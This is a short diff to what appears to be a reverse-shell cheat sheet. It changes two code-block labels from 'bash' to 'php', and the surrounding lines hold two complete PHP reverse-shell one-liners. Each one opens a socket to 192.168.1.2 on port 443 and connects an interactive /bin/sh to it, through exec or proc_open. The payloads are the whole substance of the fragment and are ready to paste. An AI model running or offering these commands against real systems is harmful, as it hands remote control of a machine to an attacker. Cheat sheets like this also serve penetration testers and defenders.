@@ -40,11 +40,11 @@
 
 * PHP
 
-   ```bash
+   ```php
   php -r '$sock=fsockopen("192.168.1.2",443);exec("/bin/sh -i <&3 >&3 2>&3");'
   ```
 
-  ```bash
+  ```php
   php -r '$sock=fsockopen("192.168.1.2",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
   ```
 
